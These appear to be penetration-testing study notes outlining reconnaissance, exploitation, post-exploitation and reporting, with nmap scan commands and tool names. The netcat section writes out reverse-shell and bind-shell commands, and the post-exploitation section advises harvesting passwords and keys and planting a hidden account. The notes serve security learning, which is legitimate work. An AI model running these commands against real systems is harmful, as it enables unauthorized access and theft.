### 2. Reconnaissance

Passive

Google dorking

WHOIS lookup

DNS enumeration

nslookup

dnsenum

dnsrecon

Active

Network scanning

nmap -p [target IP]

look for open ports like:

80 http

22 SSH

445 SMB (Windows)

nmap -sV [target IP]

maybe you can find some outdated SW or SW that contains vulnerabilities

nmap -O [target IP]

find operating system

nmap -sA [target IP]

check for firewalls

nmap --script vuln [IP]

nmap --script smb-vuln-ms17-010 [IP]

both of these run scripts checking for vulnerabilities

nmap --script ssl-enum-ciphers -p 443 [IP]

enumerates supported ciphers and detects weak ones

nmap -p3306 [IP]

scans MySQL port

nmap -sV --script=mysql-empty-password [IP]

checks for MySQL accounts with empty passwords

nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 [IP]

SMB discovery

ping

netcat (nc)

Create a listener and then receive (or send) files

nc -l -p 1234 > received_file.txt (or nc -l -p 1234 < received_file.txt)

Reverse Shell: On the attacker machine, listen for incoming connections:

nc -lvp 4444

On the victim machine, create a reverse shell:

nc target_ip 4444 -e /bin/bash # Linux

nc target_ip 4444 -e cmd.exe # Windows

Bind Shell: The victim machine opens a shell that the attacker connects to:

nc -lvp 4444 -e /bin/bash

The attacker connects to the bind shell:

nc victim_ip 4444

Port Forwarding: You can set up port forwarding with netcat, which can be useful when bypassing firewalls or accessing restricted services:

nc -lvp 1234 | nc target_ip 80

Service enumeration

nmap

enum4linux

Bloodhound

Powerview

smbmap

ldapdomaindump

dirb / gobuster

scan a web server for directories

### 3. Vulnerability Identification

Tools

Nessus

OpenVAS

Nikto

BurpSuite

Manual testing

Search for things like:

misconfigurations

outdated software

weak passwords

buffer overflows

SQL injections

### 4. Exploitation

Tools

Metasploit

sqlmap

Nessus

rpcdump

Impacket

Mimikatz

Phishin

MSFVenom

Privilege Escalation

Look for user misconfigurations, weak username/password pairs, etc.

Pivot

see what other accounts you can access

### 5. Post-Exploitation

Collect sensitive data

usernames

passwords

keys

files

Lateral movement

try to connect to other machines/devices in the network

nmap -sn [target IP range]

looks for other machines you may be able to connect to

PsExec (Windows) or SSH pivoting (Linux)

Create persistence

create hidden user account so you can get back in later

### 6. Reporting

Make sure you document:

info collected during [Reconnaissance](about:blank#reconnaissance)

vulnerabilities

name of vulnerability

severity

impact if exploited

proof

screenshots or logs

Suggest how to mitigate exploits. For example,

fix configuration settings

update software

fix buffer overflow

remove possibility of injections

etc.
